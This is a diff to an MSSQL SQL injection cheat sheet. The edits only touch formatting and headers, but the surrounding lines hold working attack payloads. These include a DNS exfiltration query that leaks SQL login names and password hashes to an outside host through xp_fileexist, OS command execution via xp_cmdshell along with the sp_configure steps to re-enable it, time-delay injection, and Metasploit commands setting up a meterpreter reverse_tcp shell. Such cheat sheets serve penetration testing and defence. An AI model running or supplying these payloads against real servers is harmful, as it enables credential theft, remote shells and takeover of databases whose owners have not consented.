@@ -91,11 +91,13 @@ WAITFOR DELAY ’0:0:5′ — pause for 5 seconds
 #make dns requests
 declare @host varchar(800); select @host = name FROM master..syslogins; exec(‘master..xp_getfiledetails ”\’ + @host + ‘c$boot.ini”’); — nonpriv, works on 2000declare @host varchar(800); select @host = name + ‘-’ + master.sys.fn_varbintohexstr(password_hash) + ‘.2.pentestmonkey.net’ from sys.sql_logins; exec(‘xp_fileexist ”\’ + @host + ‘c$boot.ini”’); — priv, works on 2005– NB: Concatenation is not allowed in calls to these SPs, hence why we have to use @host.  Messy but necessary.
 
-#command execution
+#Command execution
 EXEC xp_cmdshell ‘net user’; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
-EXEC sp_configure ‘show advanced options’, 1; — priv
+
+#Enable xp_cmdshell
+EXEC sp_configure ‘show advanced options’, 1;
 RECONFIGURE; — priv
-EXEC sp_configure ‘xp_cmdshell’, 1; — priv
+EXEC sp_configure ‘xp_cmdshell’, 1;
 RECONFIGURE; — priv
 
 #Local File Access
@@ -123,4 +125,3 @@ msf > use auxiliary/admin/mssql/mssql_enum
 
 msf > use exploit/windows/mssql/mssql_payload
 msf exploit(mssql_payload) > set PAYLOAD windows/meterpreter/reverse_tcp
-
